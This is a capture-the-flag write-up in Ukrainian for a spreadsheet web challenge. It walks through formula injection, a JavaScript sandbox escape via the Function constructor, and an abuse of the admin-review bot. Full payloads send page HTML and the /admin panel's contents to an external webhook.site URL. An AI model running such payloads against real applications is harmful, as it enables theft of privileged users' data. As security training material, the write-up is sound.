## Challenge Description

У завданні нам надано два ресурси:
1. **OpenInsight** (`open-insight.challs.umdctf.io`) — основний додаток, платформа для створення електронних таблиць (workbooks).
2. **Admin Review Queue** (`open-insight-bot.challs.umdctf.io`) — сервіс із ботом, куди можна відправити ідентифікатор таблиці (`sheetId`) для її перевірки адміністратором.

Мета: отримати доступ до панелі адміністратора та знайти прапорець.

## Initial Analysis

На сторінці Review Queue сказано, що бот відкриває надіслані таблиці з обліковими даними модератора в одноразовій сесії браузера. Під час тестування навмисно некоректних `sheetId` (наприклад, `123`) бот видавав показову помилку: 
`Waiting for selector '[data-cell-rendered="true"]' failed: Waiting failed: 6000ms exceeded`.
Це означає, що на бекенді працює headless-браузер (Puppeteer/Playwright), який переходить за посиланням на нашу таблицю та очікує її повного рендеру.

Основний додаток працює на React Server Components (Next.js). Класичні спроби вставити HTML-теги або скрипти (наприклад, `<img src=x onerror=...>`) у комірки не давали результату, оскільки фронтенд автоматично екранував будь-який HTML, відображаючи його як звичайний текст.

## Step 1 — Formula Injection

Досліджуючи інтерфейс таблиці, була знайдена підказка: `Type a value or =expression, Enter to commit`. 
Введення математичного виразу `=1+1` у комірку успішно повертало `2`. Це вказувало на те, що клієнтська частина використовує кастомний обробник (імовірно `eval` або `new Function`) для виконання коду після знаку `=`.

Спроби виконати базові JS-функції, такі як `=fetch(...)` або звернення до `window.location`, повертали помилки на кшталт `#ERR: fetch is not a function`. Це свідчило про наявність JS Sandbox (пісочниці), яка ізолює контекст виконання формул від глобальних об'єктів браузера.

## Step 2 — Sandbox Escape

Для виходу з ізольованого середовища та отримання доступу до глобального об'єкта був застосований класичний трюк із викликом глобального конструктора через базові типи даних:

```javascript
=(1).constructor.constructor("ТВІЙ_КОД_ТУТ")()
```

Такий підхід дозволив створити нову функцію поза межами пісочниці. Перевірочний пейлоад із редиректом довів, що ми успішно отримали повноцінне виконання коду (RCE) у контексті вкладки браузера.

## Step 3 — Bot SSRF та обхід HttpOnly

Наступним логічним кроком була крадіжка адміністраторських `document.cookie` через нашого бота. Однак запит прийшов порожнім — сесійні куки були захищені прапорцем `HttpOnly` і недоступні з JavaScript.

Оскільки бот має активну адміністраторську сесію і ми можемо виконувати код від його імені, ми вирішили злити весь HTML-код сторінки, щоб подивитись на неї його "очима":

```javascript
=(1).constructor.constructor("return fetch('https://webhook.site/WEBHOOK_ID/', {method: 'POST', body: document.documentElement.innerHTML})")()
```

У надісланому HTML-коді самого прапорця не було, але виявився прихований від звичайних юзерів елемент навігації — посилання на закриту панель: `<a href="/admin">Admin ▸</a>`.

## Step 4 — Data Exfiltration

Фінальний вектор атаки (Client-Side SSRF) полягав у тому, щоб змусити браузер бота зробити запит на сторінку `/admin`, прочитати її HTML-відповідь та відправити її на наш сервер.

Щоб таблиця коректно зберегла формулу і не впала з помилкою під час виконання асинхронного fetch, наприкінці пейлоаду було додано синхронне повернення числа `return 1`:

```javascript
=(1).constructor.constructor("fetch('/admin').then(r=>r.text()).then(html=>fetch('https://webhook.site/cc6b9930-f74d-4392-891d-d92c9111f9e5/',{method:'POST',body:html}));return 1")()
```

Після збереження таблиці її `sheetId` був надісланий боту. На вебхук успішно прийшов POST-запит із повним вмістом панелі адміністратора, в якій знаходився "Master flag".
